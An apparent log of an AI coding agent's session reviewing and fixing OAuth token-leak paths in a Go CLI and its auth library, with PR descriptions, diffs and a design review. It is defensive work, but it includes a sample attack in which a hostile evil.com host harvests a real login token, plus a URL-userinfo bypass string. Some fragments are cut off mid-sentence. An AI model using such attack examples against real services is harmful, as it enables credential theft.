content.text:
`Read()` is a **Claude Code permission-rule matcher**, nothing to do with your diff. Your project settings have one:

```json
// .claude/settings.json
"permissions": { "deny": ["Read(./.entire/metadata/**)"] }
```

That denies reads of `.entire/metadata/**` — the raw session transcripts. Two things about it explain the prompt you just saw:

1. **File-path rules apply to Bash too, not just the `Read` tool.** `grep`, `cat`, `sed`, `head` are all checked against `Read()` rules, which is why a `grep` triggered a rule whose name says "Read". The denial message telling me about a `Read()` rule in response to a `grep` is itself the proof of that coupling.
2. **It fails closed when the path can't be resolved statically.** My command was `cd /private/tmp/.../prs && grep -n ... 2235.diff` — a bare relative filename whose meaning depends on a `cd` earlier in the same chain. The harness can't prove `2235.diff` lands outside `./.entire/metadata/**` without executing the `cd` first, so instead of guessing it asked. Not a match against the rule — an *unprovable* non-match.

So it was my command shape, not the file. My fault: the Bash tool docs warn that `cd` in a compound command can trigger a prompt, and I used it three times. Absolute paths avoid it entirely, which is what I'll use from here.

Resuming the review of #2235.

+// rejectCrossHostRedirect stops a redirect chain from leaving the host the
+// request was sent to. Mirrors cmd/entire/cli/api.rejectCrossHostRedirect —
+// duplicated rather than imported to avoid a dependency from this
+// low-level package onto the CLI's api package. Same-host redirects (e.g.
+// a trailing-slash normalize) still follow, up to Go's usual 10-hop cap.
+func rejectCrossHostRedirect(req *http.Request, via []*http.Request) error {
+	if len(via) >= 10 {
+		return errors.New("stopped after 10 redirects")
+	}
+	if len(via) > 0 && !strings.EqualFold(req.URL.Host, via[0].URL.Host) {
+		return fmt.Errorf("refusing redirect to a different host (%s -> %s): the OAuth token request body must not leave its origin", via[0].URL.Host, req.URL.Host)
+	}
+	return nil
+}
+
 // RFC 8693 grant + token-type URNs. Re-export the literals so callers
 // composing /oauth/token forms don't keep parallel copies. Lifted out
 // of core/repoadmin and core/api during COR-337 cleanup.
@@ -107,7 +122,22 @@ func PostOAuthToken(ctx context.Context, httpClient *http.Client, coreURL string

 	}
 
-	resp, err := httpClient.Do(req)
+	// The form body (subject_token, and for password-style exchanges the
+	// caller's credentials) must never follow a redirect to a different
+	// host: Go's default client only strips sensitive *headers* on a
+	// cross-host redirect (net/http's shouldCopyHeaderOnRedirect), and
+	// copies the request body unconditionally — a POST body is not
+	// protected the way a bearer header is. Guard here, once, for every
+	// caller, rather than requiring each constructed *http.Client to set
+	// its own CheckRedirect. The guard is applied to a shallow copy so a
+	// client instance callers may share elsewhere is not mutated; note
+	// that it does take precedence over any CheckRedirect the caller had
+	// set, for the duration of this request. No caller sets one today,
+	// and a caller that needs a different policy here should be given a
+	// same-host-preserving hook rather than having this guard removed.
+	guarded := *httpClient
+	guarded.CheckRedirect = rejectCrossHostRedirect
+	resp, err := guarded.Do(req)

<!-- entire-trail-link-start -->
https://entire.io/gh/entireio/cli/trails/1227
<!-- entire-trail-link-end -->

## Why

With two saved logins and the active one on the wrong federation, git against the other one dead-ended:

```
$ git clone entire://royalcanin.partial.to/et/dogfooding/canary
fatal: cluster royalcanin.partial.to does not accept your active login
```

...even though exactly one saved login could authenticate it, and the error said so. Partial revert of https://github.com/entireio/cli/pull/1982.

## What

Restores the two tiers under the active context: **sole eligible saved login → use it**; several eligible → ambiguity error naming them. It now says which one acted, on stderr:

```
Using context 'eu.auth.partial.to'.
```

`--context` / `$ENTIRE_CONTEXT` are untouched, and an explicit one the host rejects stays a hard error — you asked for that identity by name. Nothing else from https://github.com/entireio/cli/pull/1982 is reverted.

# Security

**The hole.** `git-remote-entire` sends your login JWT as the bearer to the cluster. Which saved login it sends is decided by the cluster's own `/.well-known/entire-cluster.json`: the `core_urls` list names the login servers it accepts. That is self-reported. A hostile host can advertise a login server it does not own:

```
$ git clone entire://anything.evil.com/x/y
# evil.com serves: {"core_urls": ["https://au.auth.entire.io"]}
```

...and the CLI hands evil.com a real `au.auth.entire.io` token. This predates this PR and applies to every selection tier — explicit `--context`, the active context, and `ENTIRE_TOKEN` — not just the restored auto-select. Auto-select widens the blast radius because the attacker no longer needs the victim's *active* login to be the one they name; any saved login will do.

**Mitigation 1 — same-domain gate (all tiers, all paths).** Every advertised login server must share the target host's registrable domain (eTLD+1 via `golang.org/x/net/publicsuffix`, so `evil.co.uk` cannot match `acme.co.uk`). `evil.com` may only nominate `*.evil.com`. A mismatch is a hard error naming both hosts, never a silent filter. Enforced where the discovery result is read, so it covers the git cluster path, the data-API path, `ENTIRE_TOKEN`, and a poisoned cache entry.

**Mitigation 2 — auto-select allowlist (auto-select tier only).** A saved login is auto-selected only when the target's registrable domain is one of `entire.io`, `partial.to`, `localhost`. Hardcoded. Anything else gets today's "switch with `entire auth use`" error. Explicit and active-context selection are not gated by this — a self-hosted cluster that passes mitigation 1 still works when you name the login.

**This allowlist is an interim solution.** We are not inventing an extensible trust mechanism until a self-hosted deployment needs auto-select. If and when that happens, it gets designed properly rather than bolted on here.

## Verification

| --- | --- | --- | --- |
| `aws-ap-southeast-2.entire.io` | `entire.io` | pass | pass |
| `eukanuba.partial.to` | `partial.to` | pass | pass |

Repo worktree is back to its original clean state. Here's the review.

## What merged overnight

| PR | Author | Area |
|---|---|---|
| [#2222](https://github.com/entireio/cli/pull/2222) | jagregory | experts: resolve repo id from placement cell resolution |
| [#2208](https://github.com/entireio/cli/pull/2208) | toothbrush | top-level `entire clone` |
| [#2248](https://github.com/entireio/cli/pull/2248) | toothbrush | partial revert: auto-select the sole eligible login |
| [#2235](https://github.com/entireio/cli/pull/2235) | toothbrush | coreapi: delegate cross-jurisdiction transport to auth-go |

Dependency delta is first-party only (`auth-go` bump); no third-party module entered `go.sum`, so no external CVE surface.

## Finding: #2235 silently reverted #2224's token-leak guard

**#2224** (merged 15:41Z) added `rejectCrossHostRedirect` to `httputil.PostOAuthToken` because Go's client strips the `Authorization` *header* on a cross-host redirect but copies the POST *body* unconditionally — and the body carries `subject_token`, the user's login JWT.

**#2235** (merged 04:02Z, ~12 h later) deleted the transport that called it. The old code exchanged via `httputil.PostOAuthToken` (visible at line 1098 of the deleted `cross_juris_transport.go`); the replacement routes through `auth-go`'s `crossjuris` → `sts.Client.Exchange` → `oauthhttp.HTTPClient`, which is:

```go
return &http.Client{Transport: transport}   // internal/oauthhttp/httpclient.go
```

No `CheckRedirect`. `grep -rn CheckRedirect` across the whole auth-go module returns nothing.

I reproduced it against the exact pinned version, driving `crossjuris.Transport` with the same config `internal/coreapi/cross_juris_client.go:43` sets (`ClientID` set, `AllowInsecureHTTP: false`, TLS base — the production settings, not a loopback allowance):

```
crossjuris.go:129: 401 from https://127.0.0.1:65378: exchanged login JWT, retrying
e2e_test.go:72: LEAK: login JWT reached https://127.0.0.1:65377 via the exchange POST redirect
```

The token endpoint answered `307` and the login JWT was replayed to a third host. It fails in both directions: `crossjuris` also accepted the attacker's `access_token` from that response, cached it per-origin, and presented it to the real core.

**Severity, stated fairly.** This is defence-in-depth, not a broken boundary. `validateExchangeURL` still requires the exchange URL to be same-host with the 401, https, and path exactly `/oauth/token` — so the first hop is a core that legitimately receives the token anyway. What the guard buys is the second hop: an open redirect, a misconfigured proxy or CDN in front of a trusted core, or a federated peer forwarding onward. That was #2224's own stated justification, so the bar was already set here and this path now sits below it.

**What makes it likely to stay broken:** #2224's regression test lives in `httputil/oauth_test.go`, so it still passes while the other exchange path is unguarded. The CLI is now split — `cmd/entire/cli/auth/cell_data_api.go:685` (identity-token exchange) still uses the guarded helper; `internal/coreapi` does not.

**Fix:** upstream, in auth-go's `oauthhttp.HTTPClient` — set `CheckRedirect` there and it covers `sts` and every other OAuth caller at once. The guard is ~10 lines and already written twice in this repo. A test at the `crossjuris`/`coreapi` layer, not just `httputil`, is what pins it.

## #2248 — sound, and it closes a real pre-existing hole

Worth saying plainly: this PR found and fixed a genuine token-leak vector that predated it (a hostile host self-reporting `core_urls` and being handed a real `entire.io` token). I checked the two mitigations rather than taking the description at face value:

- **Same-domain gate is a true chokepoint.** `requireSameSiteIssuers` sits in `resolveCachedCores` (`resolve.go:187`, `:202`, `:210`) — fresh, stale-fallback, and pre-cache-write. I traced the `ENTIRE_TOKEN` path (`git-remote-entire/main.go:419` → `ResolveClusterCores` → `resolveClusterCores` → `resolveCachedCores`) and it is covered as claimed. No `Discover*` caller bypasses it.
- **No parser differential**, which is the bypass shape I went looking for. The gate reads `url.Parse(s).Host`; eligibility (`contextEligible`) compares the *same string* byte-for-byte against the saved `CoreURL`. So a `https://au.auth.entire.io@evil.com` style entry can pass the gate only by being a string that no saved login will ever match. Getting these two to agree on the same input is the thing that usually goes wrong here, and it doesn't.
- **Allowlist is exact eTLD+1 equality**, not a suffix match, so `evil-entire.io` doesn't slip through.

One residual assumption to confirm, not a defect: the gate's granularity is eTLD+1, so every subdomain of `entire.io` and `partial.to` is mutually trusted. Given `royalcanin.partial.to` / `eukanuba.partial.to` are customer-*named* clusters, the security rests on all of them being Entire-operated. If a customer can ever point DNS they control at a `*.partial.to` name, that host could nominate the real staging auth server and tier 3 would hand over a token with only a stderr notice. Also `JurisdictionCoreURL` is returned ungated in a public struct, held back only by a comment saying nothing dials it yet (`resolve.go:149`) — true today, verified.

## #2222 and #2208 — clear

**#2222** removes `resolveExpertsRepoID`, whose doc called it "authz-safe" because it filtered against the caller's accessible-repo list. That isn't a real loss: the ULID branch always passed the raw id straight through, so the filter was never a boundary, and authorization is the cell's to enforce on `POST /repos/{id}/experts`. The replacement resolves through the caller-scoped control-plane index and validates the returned `FullName` matches. The `strings.ToUpper` on the ULID (`experts_cmd.go`) is a fix, and the value is `url.PathEscape`d.

Pre-existing nit, unrelated to this PR: `looksLikeULID` checks `len(s) != 26` in **bytes** then folds case, so 13 × `ſ` (U+017F, 2 bytes each) uppercases to `SSSSSSSSSSSSS` and passes. Harmless — everything downstream is path-escaped — but the length check wants to be over runes.

**#2208** is low-risk. `exemptFromEntireDirCheck` on the new top-level `clone` matches the existing exemption on the `repo` group, so it's not new reach. Cosmetic only: `repo clone --help` now prints examples spelled `entire clone`.

---

## v0.5.2 — 2026-07-07

### Added

- `tokenmanager.Manager.ForceRefresh(ctx, staleToken)` — re-mints the login
  JWT via the refresh grant even when the stored one has not expired
  locally. For reactive 401 paths: when the server rejects a token whose
  `exp` still looks live (signing-key rotation, revocation ahead of

  unconditionally. Sentinels match `Refresh` (`ErrNotLoggedIn`,

# auth-go project notes

## Releasing — CHANGELOG discipline

Every user-visible change must land with a `CHANGELOG.md` entry in the
same PR, under the top `## Unreleased` heading. When you're about to
push code that changes behaviour, types, defaults, or wire format,
update CHANGELOG.md in the same commit set.

Bullets under `## Unreleased` must describe deltas **since the last
tag**, not since some earlier point. Stale survivors are the failure
mode — v0.3.4's draft inherited v0.3.2's `:access_token` bullet from
an Unreleased section that wasn't promoted at v0.3.2's tag time, and
the claim then read as "new in v0.3.4" until caught at tagging.

- `tokenmanager.Token` now requires `TokenRequest.Resource` to be an origin URL: absolute scheme + host, HTTPS unless loopback HTTP is explicitly enabled, and no userinfo/path/query/fragment. Opaque or non-URL resource strings that previously flowed through byte-exact are now rejected; use `Audience` for opaque audience values and `Resource` for the API origin.
- `tokenmanager.New` now holds `Config.Issuer` to the same origin-URL contract as `TokenRequest.Resource`. Issuers carrying userinfo, a path, query, or fragment are rejected at construction. Previously they were accepted and silently mis-fired the same-host shortcut, forcing every "same origin" call through the STS.
- `sts.Client.Exchange` now rejects multi-valued `Extra["client_id"]`. Different server-side form parsers picked different entries, so the wire identity was caller-invisible.

### Security

- Sanitise the AS-supplied OAuth `error` code before interpolating it into returned errors. The description was already sanitised; the code field was a parallel terminal-escape sink.
- `validateVerificationURI` rejects C1 controls (U+0080–U+009F) in addition to C0 + DEL. CSI (U+009B) is the canonical 8-bit-aware terminal-escape bypass.
- Hardened OAuth response parsing and sanitization, including oversized response rejection, trailing JSON rejection, and sanitized fallback text for non-JSON error bodies.
- Centralised OAuth HTTP helpers in `internal/oauthhttp` (origin-URL normalisation/validation, OAuth error parsing, response decoding, sanitisation) to eliminate per-package drift.
- Restricted explicit insecure HTTP opt-in to loopback hosts.
- Added `govulncheck` to the mise lint task and CI workflow.

has already passed by then, so the only thing between the user's login

the body, and the body is where subject_token lives.

The guard itself belongs in auth-go, but the test belongs here, because
"the CLI reaches a guarded client" is a property of the CLI's wiring, not
of the library: #2224 added the guard to httputil.PostOAuthToken, and
#2235 moved this path off that helper twelve hours later without anyone
noticing, precisely because #2224's regression test sits in httputil and
kept passing. Anchored where the CLI actually makes the call, this fails

R=/Users/soph/.herdr/worktrees/cli/worktree-lucky-cloud-7c4c; cd "$R" && git add cmd/entire/cli/auth/cell_data_api.go cmd/entire/cli/auth/refresh.go internal/entireclient/httputil/oauth.go internal/entireclient/httputil/oauth_test.go cmd/git-remote-entire/main.go cmd/git-remote-entire/main_test.go && git status --porcelain && git commit -q -F - <<'EOF'
auth: mint jurisdiction tokens through auth-go's sts client

The CLI had two RFC 8693 implementations. internal/coreapi's
cross-jurisdiction transport moved onto auth-go's sts in #2235; this
moves the last caller of the other one — the jurisdictional identity
token in cmd/entire/cli/auth — and deletes it.

The duplicate had drifted in ways that mattered:

  - Its OAuthError.Error() rendered the server-supplied response body
    into the terminal verbatim. auth-go sanitises the OAuth error code
    and description for terminal escapes; the CLI's parallel copy never
    picked that up.
  - It was the CLI's only exchange whose cross-host redirect guard lived
    in the CLI rather than in the library, which is how #2235 dropped
    that guard for coreapi without any test noticing.

BEHAVIOUR CHANGE, deliberate but worth reviewing: plain-HTTP handling
narrows. PostOAuthToken applied no scheme gate at all, so
--insecure-http-auth reached a plain-http core on any host, and a
misconfigured https-less core was dialled in the clear without one. sts
permits http only on loopback, even with AllowInsecureHTTP. So a
non-loopback plain-http core stops working under --insecure-http-auth,
and a plain-http core without the flag now fails closed instead of
shipping the login JWT unencrypted. This matches what the cross-juris
path already does (cross_juris_client.go gates on isLoopbackHTTP) and

- **HTTPS required.** Both `sts.Client` and `deviceflow.Client` reject `http://` BaseURLs unless `AllowInsecureHTTP` is set, and that opt-in is still limited to loopback (`localhost` / `127.0.0.1` / `::1`) so production misconfigurations fail loudly.
- **`alg:none` JWTs rejected.** `tokens.ParseClaims` decodes the JWT header and refuses the unsigned shape (any case variant of `none`). Even though claim use is routing-only, this keeps an obvious attack surface closed.
- **`verification_uri` validated.** The device-code response field is what your CLI echoes and opens in the user's browser — a malicious AS pointing it at a phishing page would be a credential-harvesting vector. The library rejects non-https (loopback http excepted), embedded `user:pass@host` userinfo, and control characters in the URI.
- **Resource origins validated.** `tokenmanager.Token` requires `TokenRequest.Resource` to be an origin URL: absolute scheme + host, HTTPS unless loopback HTTP is explicitly enabled, and no userinfo/path/query/fragment. This prevents cache fragmentation and accidental STS requests for surprising resource strings.
- **OAuth responses are bounded and strict.** Success and error bodies are capped at `MaxResponseBytes`; oversized responses are rejected, HTML/captive-portal responses get actionable errors, and JSON success bodies with trailing data are refused.
- **Server-supplied redirect targets are gated.** `crossjuris` re-targets the user's login JWT only at a `home_core_url` that is HTTPS (loopback HTTP needs `AllowInsecureHTTP`) and whose host the responding core lists as a federation peer; a `token_exchange_url` must additionally be same-host with the response that carried it and end in `/oauth/token`. Anything else surfaces the server's original response unchanged.
- **STS wire shape is explicit.** `tokenmanager` defaults `subject_token_type` to the RFC 8693 access-token URN and exposes `Config.SubjectTokenType` for STS endpoints that require the structural JWT URN.

Both repos are committed and the CLI's full CI gate is still running. Status while it finishes:

**auth-go** (`soph/oauth-reject-cross-host-redirect`, 1 commit, not pushed) — `mise run check` fully green: lint 0 issues, govulncheck clean, all packages pass with `-race`.

- `oauthhttp.HTTPClient` now installs a `CheckRedirect` pinned to the caller's host, covering `sts`, `refresh`, `authcode`, `deviceflow` in one place.
- Both new tests are verifiably red without it — the `sts` reproduction reports the `subject_token` reaching the attacker host, the constructor test reports the missing policy.
- **One thing the fix turned up that I hadn't predicted:** a blanket policy broke `TestStartDeviceAuth_ResponseOriginFollowsRedirect`. Device flow *relies* on a cross-host 307 — an apex front door redirects the device-authorization POST at a regional core, and the response origin is how the client learns which region to poll. That request is also the only one in the library whose body carries no secret (`client_id` + `scope`; a confidential client's secret rides in Basic auth, which Go already strips on a host change). So it gets an explicit opt-out via `HTTPClientFollowingCrossHostRedirects`, `postForm` now takes its client so each call site states its policy, and I added the converse test pinning that the credential-bearing *poll* refuses. Changelog + README security bullet updated.

**cli** (`soph/oauth-redirect-guard-followup`, 3 commits) — lint 0 issues, vet clean, 86 packages / 0 failures on the unit suite.

1. The coreapi-layer regression test — red against released auth-go, reporting both the leaked JWT *and* the attacker-issued token being presented to the core.
2. The cleanup: `exchangeJurisdictionToken` moves to `sts`, and `httputil`'s duplicate exchange is deleted (it's down to `OAuthClientID`). Two things I'd flag for review rather than bury:
   - **A behavior change.** `PostOAuthToken` had *no* scheme gate, so `--insecure-http-auth` reached a plain-HTTP core on any host. `sts` allows HTTP only on loopback. A non-loopback plain-HTTP dev core stops working; a plain-HTTP core *without* the flag now fails closed instead of shipping the login JWT in the clear. This matches what the cross-juris path already does and what auth-go chose deliberately — but it's a real change to a hidden escape hatch, so it's called out in the commit message.
   - The deleted `OAuthError.Error()` rendered the server's raw response body to the terminal; `sts` sanitizes both error fields. The CLI's copy never picked up that hardening.
3. A clearly-labelled `TEMPORARY:` commit holding the local `replace` — auth-go isn't merged, so there's no pseudo-version yet. Drop that commit and `go get github.com/entireio/auth-go@<merged-sha>` before opening the CLI PR. `mise run lint` fails while it's in place, so CI can't silently accept it.

**Not a signal-path bug.** The test spawns the real `entire` binary, which
resolves `entire trapint` to a shell plugin on PATH, and waits
`waitForFile(readyFile, 3*time.Second)` for the plugin's ready marker. That
budget has to cover process spawn + binary load + external-command resolution +
`sh` startup — all under `-race`, which slows the binary substantially. On a
machine doing anything else concurrently, 3s is not enough and the test kills
the child and reports the readiness message.

Sighted 2026-09-03 while running `test:ci` alongside another repo's `-race`
suite. Re-ran the identical tree on an idle machine: `EXIT=0`, 87 packages,
0 failures. In isolation it passes `-count=3` even under load.

**Triage before you chase it:** the printed "parent stderr" is a red herring —
it carries whatever the binary last logged (investigate turn lines, in the
sighting above), which has nothing to do with the failure. Check machine load
first, then re-run the package alone. Only suspect the change under test if it
touches external-command dispatch (`cmd/entire/`'s kubectl-style
`entire <name>` → `entire-<name>` resolution) or signal forwarding; an unrelated
diff cannot make this test fail except through timing.

The durable fix would be raising the readiness budget or making it
load-proportional, not adding retries. Same family as
[[etxtbsy-fake-binary-flake]] — a test that writes and execs a fake binary and
is sensitive to process-startup timing.

## auth-go — `soph/oauth-reject-cross-host-redirect` (1 commit)

`mise run check` fully green: lint 0 issues, govulncheck clean, `-race` suite passing.

`oauthhttp.HTTPClient` installs a `CheckRedirect` pinned to the caller's host — one seam covering `sts`, `refresh`, `authcode`, `deviceflow`, all four of which post a credential in the form body. Both new tests are demonstrably red without it: the `sts` reproduction names the attacker host receiving `subject_token`, the constructor test reports the missing policy.

The fix surfaced something I hadn't predicted: a blanket policy broke device flow, which *relies* on a cross-host 307 (apex front door → regional core, and the response origin is how the client learns which region to poll). That request is also the only one whose body carries no secret. It gets an explicit opt-out via `HTTPClientFollowingCrossHostRedirects`, `postForm` now takes its client so each call site states its policy, and I pinned the converse — the credential-bearing poll refuses. Locking that down wants a federation-manifest check like `crossjuris` already does for 421s — a design decision, not something to slip into a redirect-guard PR.

<result>## Altitude review: cross-host redirect guard for OAuth bodies

I read both diffs, the four flow packages, `crossjuris`, and the CLI's five HTTP-client construction sites. Headline: **the chosen altitude is right, and it is the deepest one that exists.** Three of the four questions come back "no finding, and here's why"; the real findings are about invariants the fix leaves unenforced, and about one step of the CLI cleanup that stopped short.

---

### 1. Is `oauthhttp.HTTPClient` the right depth? — Yes, and it is provably a chokepoint

`auth-go/internal/oauthhttp/httpclient.go:33`

Two structural facts make this the deepest correct point, and both should be stated in the PR because they are what make the placement defensible rather than merely convenient:

**A `CheckRedirect` policy cannot live below an `http.Client`.** A `RoundTripper` never follows a redirect — it returns the 3xx. So "a RoundTripper-level guard" is not a deeper altitude for *this* mechanism; it does not exist. The only construct that can refuse a redirect is the `http.Client`, and `oauthhttp.HTTPClient` is the sole place in the library that builds one.

**Nothing in auth-go's public API lets a caller inject an `*http.Client`.** Every flow exposes `Transport http.RoundTripper` and builds its own client (`sts/sts.go:168`, `deviceflow/deviceflow.go:113`, `authcode/authcode.go:138`, `refresh/refresh.go:54`), each documenting the TLS-bypass rationale. That pre-existing decision is what turns `HTTPClient` from "a helper most callers use" into a boundary a caller cannot route around. The fix leans on it without saying so; it is worth one sentence, because a future `Client.HTTPClient` field would silently un-do this change.

Verified: exactly four `.Do(` sites in the library (`sts:259`, `refresh:210`, `authcode:708`, `deviceflow:525`), all fed by `oauthhttp`.

**On `crossjuris`'s direct `Base.RoundTrip` calls — not a gap.** Both were checked:

- `crossjuris/crossjuris.go:353` (federation manifest) — GET, no body, no credential. A 3xx here is not followed at all (bare RoundTripper), fails JSON parse, returns nil hosts, and the trust gate fails closed. Correct by construction.
- `crossjuris/crossjuris.go:181` (the caller's request and its 421 replay) — the credential is the `Authorization` header, which `crossjuris` re-stamps per `RoundTrip` call. On a cross-host 307 `net/http` strips the header before the next `RoundTrip`, so `originalAuth` is empty on that hop, `lookupToken(attackerOrigin)` misses, and no header is set. No credential leaves.
- The credential-bearing request `crossjuris` does make — the RFC 8693 exchange at `crossjuris/exchange.go:161` — goes through `sts.Client`, therefore through `oauthhttp.HTTPClient`. Guarded.

So: **every request in auth-go that carries a credential in its body passes through the guarded constructor, and the two that bypass it carry no credential and follow no redirects.** No finding.

**Finding 1.1 (low, reuse):** `httpclient.go:104` compares hosts with `strings.EqualFold(req.URL.Host, via[0].URL.Host)`, while `oauthhttp/origin.go:20` already owns `NormalizeOriginURL`, which lower-cases and drops default ports. The hand-rolled comparison refuses `https://core.example` → `https://core.example:443` as a "different endpoint". The doc calls port-sensitivity deliberate, which is fine as policy — but the deeper move is to express it *through* the package's existing origin primitive (compare normalized hosts, then decide about ports explicitly) rather than beside it. Two host-comparison idioms in one 80-line package is how they drift.

---

### 2. The deviceflow exemption — right shape, resting on an unenforced invariant

`auth-go/internal/oauthhttp/httpclient.go:64`, `deviceflow/deviceflow.go:186`

**Verdict: the two-constructor shape is right, and I'd reject the "property of the request" alternative.** The properties that matter:

- The default is safe. A fifth flow that writes `oauthhttp.HTTPClient(c.Transport)` — the obvious thing — is guarded. Getting it wrong requires typing a 41-character name whose doc says "Do NOT reach for this anywhere else".
- The choice is already per-request, not per-client: `httpClient()` allocates a fresh client per call, and this diff moved the client to a `postForm` parameter (`deviceflow.go:508`), so the two call sites each *state* their policy at the line where the body is built. That is the per-request expression the alternative was after; the second constructor is just its spelling.
- I considered deriving the policy from the body — refuse the redirect only when the form carries `subject_token`/`refresh_token`/`code`/`code_verifier`/`device_code`/`client_secret`. It is mechanically possible via `req.GetBody` inside `CheckRedirect`, and it is the most "general" answer. **Reject it:** it fails open on any credential field nobody enumerated, which inverts the safe default. A safe default plus a loud opt-out beats content sniffing.

**Finding 2.1 (medium — the actual altitude issue):** The exemption's stated justification is "its body is `client_id` plus `scope` — neither a secret". That is true today *because the device-auth body is a closed set the library builds itself* (`deviceflow.go:293-297`, no caller extension point) — unlike `sts.ExchangeRequest.Extra` (`sts/sts.go:91`), which is exactly that extension point on the sibling flow. The invariant the exemption rests on is therefore structural, but it is asserted only in prose. The day `deviceflow.Client` grows an `Extra url.Values` for parity with `sts` — a plausible, innocuous-looking change — the exemption silently becomes a credential leak, with no red test. **Deeper:** pin it. A three-line test asserting the device-auth form's key set is exactly `{client_id, scope}` converts a comment into a tripwire, at the same altitude as the exemption itself.

**Finding 2.2 (medium — inconsistent depth inside one module):** `HTTPClientFollowingCrossHostRedirects` follows a *server-chosen* cross-host target with no trust gate of any kind, and that target then picks the `verification_uri` shown to the user and the origin later polled with the device code. `validateVerificationURI` (`deviceflow.go:369`) is shape-only — https, no userinfo, no control chars, ASCII host — so an attacker-chosen origin's phishing URI passes. Meanwhile the *same module*, for the structurally identical decision, gates: `crossjuris` will not follow a `home_core_url` unless its host appears in the responding core's federation manifest (`crossjuris.go:275`), and the README advertises "Server-supplied redirect targets are gated" as a library property. Device flow is now the one place that claim is false, and the obligation is exported to the caller as documentation ("validate `DeviceCode.ResponseOrigin` before assigning it to `TokenBaseURL`") — i.e. *after* the hop, after the response was parsed.

**Deeper alternative:** parameterize instead of exempting. `deviceflow.Client.AllowRedirectTo func(host string) bool`, nil meaning refuse, wired into a `CheckRedirect` that consults it. The exemption constructor disappears; the trust decision moves from post-hoc advice to a pre-hop gate; and a fifth flow needing regional routing gets the mechanism rather than a second copy of the opt-out. Worth noting this is not hypothetical rigor: the CLI *already implements the predicate* — `adoptIssuer`/`issMatches` (`cli/login.go:625`, `:563`) enforces an https-only, same-port, strict-subdomain delegation rule on `ResponseOrigin`. Today that runs one layer too late. Handing it to auth-go would make it run at the hop.

(To be clear: this preserves the status quo rather than regressing it — device auth was never guarded. The finding is that the fix drew the line at "credential in body" and left the sibling trust question at a shallower depth than the module's own neighbouring code.)

---

### 3. The CLI side — right direction; one step short, and `api/client.go` is *not* an inconsistency

**Migrating `exchangeJurisdictionToken` onto `sts.Client` is the right depth.** It deletes the CLI's parallel RFC 8693 implementation, and the switch of `git-remote-entire`'s `errors.As` target from `httputil.OAuthError` to `sts.ExchangeError` (`cmd/git-remote-entire/main.go:246`) is not a rename — `tokenmanager` already produced `sts.ExchangeError` for the repo-scoped exchange, so the CLI was matching on a type its surviving code path no longer emitted. Verified: zero `x-www-form-urlencoded` POSTs remain outside auth-go; every CLI OAuth exchange now runs through one implementation. `internal/oauthhttp` being unimportable costs nothing today because the CLI has no OAuth request of its own left.

**`cmd/entire/cli/api/client.go:65,74` is a legitimately separate concern, not residue.** This is the finding I'd most want not to be "fixed": `bearerTransport.RoundTrip` (`api/client.go:119`) stamps `Authorization` on **every** hop, below the redirect layer. `net/http`'s cross-host header strip operates on the headers it copies forward — it cannot strip a header the transport re-adds afterwards. So this client's threat is a *header* that survives the mechanism that is supposed to remove it, which is a different failure than "the body was replayed". Deleting or unifying this guard on the grounds that "auth-go handles redirects now" would reintroduce a real leak. The two policies happen to be byte-identical; their reasons are not, and they may legitimately diverge (see Finding 1.1 on port handling).

**Finding 3.1 (medium):** The CLI now has five `http.Client` construction sites with five different redirect answers, one of which is "unset by omission":

| site | policy |
|---|---|
| `cmd/entire/cli/api/client.go:65` | refuse cross-host (header re-stamped below the strip) |
| `internal/remotehelper/transport/proxy.go:189` | follow, re-carry `Authorization` in-cluster, strip out-of-cluster |
| `internal/entireclient/clusterdiscovery/discovery.go:111` | refuse all redirects (trust-root fetch) |
| `cmd/entire/cli/plugin_fetch.go:102` | re-run the transport check per hop |
| `internal/coreapi/cross_juris_client.go:36` | **none** |

The last one follows a cross-host 307 and replays the API request body (`crossjuris` sets `GetBody`). No credential — the bearer is stripped and `crossjuris` re-derives it as empty on the foreign hop — but a `POST /api/v1/mirror-requests` payload does travel to a host the user never dialled, and nothing records that this was a decision rather than an omission. **Deeper alternative, and it is this repo's own idiom:** a `TestHTTPClientsDeclareRedirectPolicy` guard test with a reasoned allowlist, modelled directly on `cmd/entire/cli/osroot/rootbase_guard_test.go` (`allowedRootBases`) and `gitrepo/gitstatus_guard_test.go`. Same shape: every `&http.Client{` in non-test code either sets `CheckRedirect` or appears in a map whose value is the reason. That converts "five sites, five answers, one blank" into an enumerated policy, and it is the only mechanism here that would catch the *next* client someone adds.

**Finding 3.2 (low):** `internal/entireclient/httputil` is now a package containing one string constant (`oauth.go:18`) plus a paragraph about what it used to contain. Its three importers are `cli/auth/provider.go` (which already aliases it to unexported `oauthClientID`), `cli/auth/cell_data_api.go`, and `internal/coreapi/cross_juris_client.go` — and `internal/coreapi` **already imports `cmd/entire/cli/auth`** (`coreapi/client.go:12`), so there is no cycle. Export `auth.OAuthClientID` and delete the package. The name `internal/entireclient/httputil` no longer describes a client id, and a package that exists only to hold a constant its own doc comment is an obituary for is the residue of a deletion that stopped one file early.

**Finding 3.3 (low):** `exchangeJurisdictionToken(..., httpClient *http.Client)` (`cell_data_api.go:700`) now takes an `*http.Client` solely to pull `.Transport` off it, and the `Timeout` its producer set (`cellExchangeHTTPClient`, `:353`) is silently discarded on this path while still applying to the cluster-listing path. The doc comment explains the discard well, but the signature no longer states what the function needs. Deeper: have `cellSubject` carry the `http.RoundTripper` and let each consumer build the client it wants — the transport is the thing genuinely shared; the client is not.

---

### 4. Test altitude — keep the CLI test; it is under-mirrored, not redundant

`internal/coreapi/cross_juris_client_test.go:443`

**Keep it, and the stated justification checks out empirically.** I verified the history: `8b942ab0b` (#2224, guard added to `httputil.PostOAuthToken`) merged 2026-09-02 15:41 UTC; `408372c97` (#2235, this path moved off that helper) merged 2026-09-03 04:02 UTC — 12.3 hours, with #2224's regression test sitting in `httputil` and passing throughout. That is a demonstrated failure mode, not a hypothetical one.

The test's unique claim is a CLI property no auth-go test can assert: that `newCrossJurisRoundTripper` — the real production chain, not a fake — still routes the exchange through a guarded client. It catches a pinned-old-auth-go, a CLI-side wrapper that follows redirects itself, and a future re-routing of this path. Not redundant with `sts/redirect_test.go` (proves `sts` refuses) or `oauthhttp/httpclient_test.go` (proves the constructor installs it).

